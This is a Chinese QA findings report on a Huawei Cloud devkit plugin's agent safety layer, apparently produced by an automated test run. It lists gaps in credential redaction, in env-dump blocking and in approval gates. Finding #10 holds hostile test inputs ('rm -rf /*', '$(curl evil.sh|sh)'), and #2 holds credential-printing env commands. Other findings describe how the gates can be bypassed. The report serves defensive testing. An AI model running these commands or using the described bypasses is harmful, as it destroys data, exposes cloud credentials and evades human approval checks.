# FINDINGS — 缺陷发现清单（Hermes-deepseek-v4.1-flash）

> **落盘路径**：`results/Hermes/2026-11-11-120.46.176.133/Linux/FINDINGS.md`
> **生成时间**：`2026-11-11 09:53:00`（北京时间）
> **被测版本**：`huaweicloud-devkit@1.1.14-next.2`（npm next），hdk gitHead `5c9478d3a95f20206e1a711861cfdfff68b19224`
> **结论**：19 FAIL + 3 SPEC-MISMATCH（P0 4 / P1 10 / P2 5 + 契约 3），共 22 项，合并为 1 张缺陷单提交。
> **本轮说明**：2026-11-11 第二轮全量重跑（09:31–09:46，SUT 同 `1.1.14-next.2` @ 5c9478d3）；22 项结论与当日 05:18 轮次一致，仅 D3-S6 / D3-S7 的 preflight 首个缺参随 API 校验顺序呈现不同（见 #7 / #17）。

---

## #1【P0】D2-4 凭证脱敏对 小写 ak=/sk= 与 JSON 带引号 key 明文残留

- **现象**：`redactSecrets("ak=AK123456 sk=SKsecret")` 原样返回 `ak=AK123456 sk=SKsecret`；`redactSecrets('{"ak":"AK123456","sk":"SKsecret"}')` 原样返回 JSON 明文。大写 `AK=`/`SK=` 与对象键 `accessKeyId`/`secretAccessKey` 均正常替换为 `<redacted>`。
- **断言**：`redactSecrets` 对 大写 AK/SK、小写 ak/sk、JSON 带引号 key、对象键 四种形态**全部**返回 `<redacted>`；实测 2/4 形态未脱敏。
- **根因**：`plugins/huaweicloud-core/src/safety-policy.mjs:45` `redactString` 第三处 `.replace` 的 `(AK|SK)` 正则大小写敏感（无 `/i` 标志），漏掉小写 `ak=`/`sk=`；同文件 `isSecretKeyName` 的键名正则只匹配 `accessKeyId` 一类，不匹配裸 `"ak"`/`"sk"` JSON key。
- **影响**：任何把凭证以小写键或 JSON 形式回显的命令/工具输出会明文泄露 AK/SK。
- **证据**：`evidence/D2-4/stdout.txt`

## #2【P0】D4-2 凭证 env 打印拦截漏判裸 access_key 形态

- **现象**：`env | grep HW_ACCESS_KEY`、`printenv HW_SECRET_KEY`、`env | grep HUAWEICLOUD_SDK_AK`、`env | grep HCLOUD_AK` 均 `decision=deny risk=credential`；但 `env | grep -i access_key` 判 `decision=allow risk=not_huaweicloud`。
- **断言**：所有读取/打印云凭证环境变量的命令（含小写、裸 `access_key` 键名）必须 `decision=deny risk=credential`；实测 1/5 形态被放行。
- **根因**：`plugins/huaweicloud-core/src/safety-policy.mjs` env-dump 检测仅枚举 `HW_*`/`HUAWEICLOUD_SDK_*`/`HCLOUD_*` 等具名键，未覆盖裸 `access_key`/`secret_key` 及 `-i` 大小写不敏感检索形态。
- **影响**：攻击者可绕过 P0 凭证 env 拦截，直接打印 SDK 通用命名（`access_key`）的凭证。
- **证据**：`evidence/D4-2/stdout.txt`

## #3【P0】D4-21 hook_check_artifacts 对 AdministratorFullAccess 制品放行

- **现象**：`huaweicloud_hook_check_artifacts` 对 `broad-iam` 制品返回 `ok=false decision=deny`（`hwc-iam-admin-policy` 命中），但对引用 `AdministratorFullAccess` 托管策略的 `admin-full` 制品返回 `ok=true decision=allow`。
- **断言**：凡授予管理员级权限的 IaC/策略制品（含 `Action:"*"` 与托管策略 `AdministratorFullAccess`/`AdministratorAccess` 引用）一律 `decision=deny`；实测 1/2 形态被放行。
- **根因**：`plugins/huaweicloud-core/safety/rules/cloud-risk-rules.json` 的 `hwc-iam-admin-policy` 规则仅匹配 JSON `Action:"*"` 形态，未覆盖 HCL `actions=["*"]` 与托管策略名引用。
- **影响**：P0 制品预检对「直接用管理员托管策略」这一最常见提权写法失效。
- **证据**：`evidence/D4-21/stdout.txt`

## #4【P0】D9-12 initialize 握手缺少版本检查与非法时序拒绝

- **现象**：`initialize` 返回 `{"protocolVersion":"2024-11-05","capabilities":{"tools":{}},"serverInfo":{...}}` 正常；但 ① initialize 分支 `runVersionCheck=false`（`cached/hash=true`）② 未先 `initialize` 直接 `tools/list` 仍返回 46 工具、未返回 JSON-RPC `-32600`。
- **断言**：initialize 阶段必须执行版本检查；未初始化即 `tools/list` 必须返回 `{"code":-32600}`；实测两项均不满足（4/6 断言通过）。
- **根因**：`plugins/huaweicloud-core/src/mcp-protocol.mjs` ① initialize 分支未调用 `runVersionCheck`（版本检查已下沉 prewarm / `check_cli` 工具）② `dispatch` 无「必须先 initialize」的状态机校验。
- **影响**：协议生命周期契约被破坏，客户端可能在不合规时序下静默拿到工具清单。
- **证据**：`evidence/D9-12/stdout.txt`

## #5【P1】D1-70 代理配置链路因 undici zstd 拦截器崩溃不可用

- **现象**：`proxy.json` 读写、`getProxySettings` 合并 env+file、`no_proxy` 命中返回 null 均通过；随后 `EXC: Cannot read properties of undefined (reading 'bind')`，WebSocket/HTTP 代理构造失败。
- **断言**：`proxy.json` 读写/clear 正确 + 有代理时 WebSocket 走 undici `ProxyAgent`、无代理回退 `globalThis.WebSocket`，不得抛异常。
- **根因**：`plugins/huaweicloud-core/src/proxy.mjs` 加载 `undici@8.x` 的 `ProxyAgent` 时触发 `lib/interceptor/decompress.js:78` 调用 `createZstdDecompress`（`node:zlib` 导出为 `undefined`）后 `.bind()` → `TypeError`。
- **影响**：企业内网（需代理）场景下代理功能整体不可用。
- **证据**：`evidence/D1-70/stdout.txt`

## #6【P1】D3-C4 服务创建类回归：DMS、DEW 无规范路由

- **现象**：真云 22 个服务 `list_operations + plan` 实测 20/22 OK；`[D3-C4] DMS: list_operations+plan -> FAIL`、`[D3-C4] DEW: list_operations+plan -> FAIL`。
- **断言**：22 个服务全部返回规范 `command`/`result`；实测 DMS、DEW 两项缺失。
- **根因**：`plugins/huaweicloud-core/src/tools.mjs` `huaweicloud_list_operations` 的服务路由表未覆盖 DMS、DEW（返回空 command/result）。
- **影响**：DMS/DEW 场景无法给出可执行命令，Agent 只能猜测操作名。
- **证据**：`evidence/D3-C4/stdout.txt`

## #7【P1】D3-S7 跨服务交付：RDS CreateInstance 缺 db.password 且复合意图未命中部署目标

- **现象**：`run RDS CreateInstance -> ok=false stdout=[USE_ERROR]Invalid parameter: db.port`（当日 05:18 轮同用例报 `db.password`，缺项随校验顺序呈现不同）；复合意图路由 `services=["RDS"]`（RDS 命中=true，部署目标命中=false）。
- **断言**：RDS 最小实例创建成功（返回实例 ID）+ 复合意图同时命中 RDS 与部署目标；实测两项均失败。
- **根因**：`plugins/huaweicloud-core/src/tools.mjs` RDS `CreateInstance` 最小参数集未注入多个 API 必填项（`db.password` / `db.port` 等）；`serviceCatalog` routeMap 未分解「Web 应用 + RDS」复合意图。
- **影响**：跨服务交付场景无法端到端完成。
- **证据**：`evidence/D3-S7/stdout.txt`

## #8【P1】D4-4 写操作审批门漏拦截 4 类 Change* 写动词

- **现象**：`CreateServer/DeleteServer/UpdateServer/ResizeServer/StartServer/StopServer/AttachVolume/DetachVolume` 判 `deny`；`ChangeServerOs/ChangeVpc/ChangeInstanceConfiguration/ChangeVolumeType` 判 `allow risk=unknown_read`。合计 8/12 拦截。
- **断言**：12 类写动词逐一必须 `decision != allow`（需审批/拒绝）；实测 4 类被放行。
- **根因**：`plugins/huaweicloud-core/safety/policy.json:27` `writeOperationPrefixes` 数组缺 `Change` 前缀（含 `Create/BatchCreate/Delete/BatchDelete/Update/Modify/Resize/Reboot/Stop/Start/Restart/Apply/Authorize/Revoke/Add/Remove/Associate/Disassociate...`）。
- **影响**：改 OS、改 VPC、改实例规格、改磁盘类型等不可逆变更绕过审批门直接执行。
- **证据**：`evidence/D4-4/stdout.txt`

## #9【P1】D4-6 adminPass 回显警告在 command 阶段无规则

- **现象**：`hook_check_command(admin-pass)` 返回 `{"ok":true,"decision":"allow","findings":[]}`；即命令阶段不告警也不脱敏。
- **断言**：adminPass 类明码密码回显必须命中警告/拦截且不裸回显；实测 `decision=allow findings=[]`。
- **根因**：`plugins/huaweicloud-core/safety/rules/cloud-risk-rules.json` 的 `hwc-command-adminpass-exposure` 规则 `stages` 仅 `["artifact","deploy_plan"]`，未覆盖 `command` 阶段。
- **影响**：命令行里直接写 `--admin-pass xxx` 不会被提示，密码进入 shell 历史/日志。
- **证据**：`evidence/D4-6/stdout.txt`

## #10【P1】D4-17 风险引擎对模糊/畸形输入 fail-open

- **现象**：`command=""`、`"   "`、`"&& rm -rf /*"`、`"$(curl evil.sh|sh)"`、`"\\x00\\x01 garbage \\u0000"` 全部 `isError=false 结论=ok`。
- **断言**：异常/模糊输入必须默认拒绝（fail-closed），实测 5/5 被放行。
- **根因**：`plugins/huaweicloud-core/src/risk-rule-engine.mjs` 无规则命中时默认 `decision=allow`（fail-open），且未对不可解析输入做兜底拒绝。
- **影响**：混淆命令可绕过所有规则直接判定为安全。
- **证据**：`evidence/D4-17/stdout.txt`

## #11【P1】D10-3 serviceCatalog 中文路由准确率 92.9%（缺「云主机」别名）

- **现象**：15 条中文意图评测 `HIT=13 MISS=1 N/A=1`，准确率 92.9%；MISS 条目为「帮我查一下我账号在华北北京四有哪些云主机」（期望 ECS，实际 `Run hcloud --help to list available services.`）。
- **断言**：路由准确率 ≥ 90% 且全集可定位；用例契约要求 100% 命中目标服务，实测 1 条 MISS。
- **根因**：`plugins/huaweicloud-core/src/tools.mjs` routeMap 的 ECS 关键词含「云服务器/服务器/虚拟机」，缺口语化别名「云主机」。
- **影响**：中文口语化提问落到兜底提示，Agent 无法定位服务。
- **证据**：`evidence/D10-3/stdout.txt`、`evidence/_probes/eval-harness.log`

## #12【P1】EXP-C4-14 DMS 服务 list_operations 未返回 command/result

- **现象**：`[D3-C4] DMS: list_operations+plan -> FAIL`（真云实测，同 #6）。
- **断言**：DMS 的 `huaweicloud_list_operations` 必须返回规范 `command` 与 `result`；实测缺失。
- **根因**：`plugins/huaweicloud-core/src/tools.mjs` 服务路由表未覆盖 DMS。
- **影响**：DMS 只读规划冒烟不可执行。
- **证据**：`evidence/EXP-C4-14/stdout.txt`

## #13【P1】EXP-C4-18 DEW 服务 list_operations 未返回 command/result

- **现象**：`[D3-C4] DEW: list_operations+plan -> FAIL`（真云实测，同 #6）。
- **断言**：DEW 的 `huaweicloud_list_operations` 必须返回规范 `command` 与 `result`；实测缺失。
- **根因**：`plugins/huaweicloud-core/src/tools.mjs` 服务路由表未覆盖 DEW。
- **影响**：DEW 只读规划冒烟不可执行。
- **证据**：`evidence/EXP-C4-18/stdout.txt`

## #14【P1】EXP-E01 中文意图「云主机」路由 MISS

- **现象**：`EXP-E01 | MISS | 期望=ECS | 实际=Run hcloud --help to list available services.`
- **断言**：`serviceCatalog("帮我查一下我账号在华北北京四有哪些云主机")` 必须命中 ECS；实测 MISS。
- **根因**：`plugins/huaweicloud-core/src/tools.mjs` routeMap ECS 关键词缺「云主机」口语化别名。
- **影响**：同 #11，评测集基线不达标。
- **证据**：`evidence/EXP-E01/stdout.txt`

## #15【P2】D3-C14 沙箱 hdkitConnect 未透传全部可选参数

- **现象**：`[FAIL] hdkitConnect 透传可选参数到 body`；其余三项（缺参报错 / hwlink `{ak,sk,securitytoken}` / `x-security-token` 签名头）通过。
- **断言**：`hdkitConnect` 必须把 `source/env/git/flavor_id` 等可选参数全部透传到请求 body；实测存在遗漏。
- **根因**：`plugins/huaweicloud-core/src/sandbox.mjs` `hdkitConnect` 的 body 组装仅覆盖部分可选字段。
- **影响**：沙箱按环境/来源差异化创建时参数丢失。
- **证据**：`evidence/D3-C14/stdout.txt`

## #16【P2】D3-S5 复合意图未分层拆分

- **现象**：复合意图（存储+托管/部署）路由返回 `skills=["Use huaweicloud-core to route intent."]`、`services=["Run hcloud --help to list available services."]`；存储命中=false、托管命中=false、多路命中=false。
- **断言**：复合意图必须拆分并同时命中多个 service（存储 + 托管）；实测 0 命中。
- **根因**：`plugins/huaweicloud-core/src/tools.mjs` `serviceCatalog` routeMap 单意图匹配，无复合意图分解逻辑。
- **影响**：一句多诉求的需求被降级为兜底提示。
- **证据**：`evidence/D3-S5/stdout.txt`

## #17【P2】D3-S6 FunctionGraph CreateFunction 最小参数模板缺项（本轮报 function_name）

- **现象**：`run CreateFunction -> ok=false stdout=[USE_ERROR]Invalid parameter: function_name`（当日 05:18 轮同用例报 `code.filename`），URN 未返回、定时触发器未绑定。
- **断言**：最小参数集创建 Python 函数必须返回 URN 且定时触发器绑定成功；实测 2 项失败。
- **根因**：`plugins/huaweicloud-core/src/tools.mjs` FunctionGraph `CreateFunction` 的最小参数模板缺项（`function_name` / `code.filename` 等多个必填项未注入，API 按校验顺序报第一个缺失项）。
- **影响**：函数计算场景无法一键创建。
- **证据**：`evidence/D3-S6/stdout.txt`

## #18【P2】D4-25 Python hook 把写操作遥测分类为 cli:invoke

- **现象**：`{"key":"cli:invoke","value":"hcloud vpc CreateVpc","capability":"cli"}`；只读与 help 分类正确。
- **断言**：写操作事件必须分类为 `cli:write`；实测 `cli:invoke`。
- **根因**：`plugins/huaweicloud-core/hooks/huaweicloud-safety.py` 的 `WRITE_OPERATION_RE` 前置捕获组导致 `vpc CreateVpc` 未命中写操作分支。
- **影响**：遥测统计低估写操作量，审计口径失真。
- **证据**：`evidence/D4-25/stdout.txt`

## #19【P2】D4-26 findings.evidence 中 secret_key/adminPass 明文残留

- **现象**：`evidence(已脱敏)=tf/main.tf {"access_key":"AKIA***","secret_key":"SKSECRETVALUE9","adminPass":"MyP@ss12345",...}`，`[FAIL] 明文 AK/SK/password 无残留`。
- **断言**：findings.evidence 内 AK/SK/token/password 必须全部 `<redacted>`；实测 3 个字段中 2 个明文。
- **根因**：`plugins/huaweicloud-core/src/risk-rule-engine.mjs` `redactEvidence` 正则不匹配 JSON 带引号 key 形态。
- **影响**：风险报告的 evidence 字段本身泄露凭证。
- **证据**：`evidence/D4-26/stdout.txt`

## #20【P1】D9-9 initialize capabilities 未声明 cancellation（SPEC）

- **现象**：`capabilities = {"tools":{}}`，`capabilities.cancellation 存在? false`。
- **断言**：用例契约要求按 capabilities 实测取消能力并声明；实现未声明 `cancellation`。
- **根因**：`plugins/huaweicloud-core/src/mcp-protocol.mjs` initialize 的 capabilities 仅输出 `{tools:{}}`。
- **影响**：客户端无法感知/使用取消语义，长任务只能等超时。
- **证据**：`evidence/D9-9/stdout.txt`

## #21【P0】D10-4 静态规则库计数与用例契约漂移（SPEC）

- **现象**：`规则库: version=0.1.0 规则数=19 severity={"deny":9,"warn":10}`，用例断言 16 条（9 deny + 7 warn）；检测行为本身合格（凭证文件 deny / 只读 allow / 删除 warn / 明文 secret deny）。
- **断言**：规则库应为 9 deny + 7 warn（16 条）；实测 19 条（9+10）。
- **根因**：`plugins/huaweicloud-core/safety/rules/cloud-risk-rules.json` 新增规则后用例断言未同步（契约漂移，非功能缺陷）。
- **影响**：报告计数口径失真，易误判规则缺失。
- **证据**：`evidence/D10-4/stdout.txt`

## #22【P2】D8-9 遥测 sanitizeValue 不脱敏 AK/SK/token（SPEC）

- **现象**：`sanitize(access_key/token=...)` 原样返回 `access_key=AKIA123 secret_key=SECRET token=T0K3N_SECRET`；仅控制字符/超长截断生效。
- **断言**：用例契约要求 sanitizeValue 移除 AK/SK/token 等敏感值；实测敏感值原样保留。
- **根因**：`plugins/huaweicloud-core/src/telemetry/telemetry.mjs` `sanitizeValue` 仅去控制字符 + 255 字符截断，无凭证脱敏。
- **影响**：遥测上报可能携带凭证明文。
- **证据**：`evidence/D8-9/stdout.txt`

---

## 非产品缺陷（不计入提单）

## #90【非产品缺陷】探针/断言口径滞后项（测试侧修正）

- **现象**：`D1-27`/`EXP-NR3-02`（JSON 空格正则误判）、`D6-4`/`D5-3`/`D9-1`/`EXP-D5-8-3`（工具数硬编码 40，实测 46）、`D8-7`（命中文档中正常用词 `placeholder`）、`D4-13`（CES 响应 `SYS.0403` 误命中 denied 正则）、`D4-11`（回显查询串被误判为执行注入）。
- **说明**：以上用例实测均满足设计意图，属探针/断言文本滞后，建议测试侧改为读取 `TOOL_DEFINITIONS.length` 与更精确的 JSON 断言；不计入产品缺陷。

## #91【非产品缺陷】D1-39 Windows 专属用例在 Linux 不适用

- **现象**：D1-39（P0）为 Windows 升级检测链 EINVAL 场景，OS 列标注「专属」，本机 Linux 无法执行，标 NOT_RUN。
- **说明**：Linux 侧由展开级 `EXP-NR3-10`（queryDistTagsSync/queryDistTags 均 PASS）代表覆盖；非缺陷，不计入提单。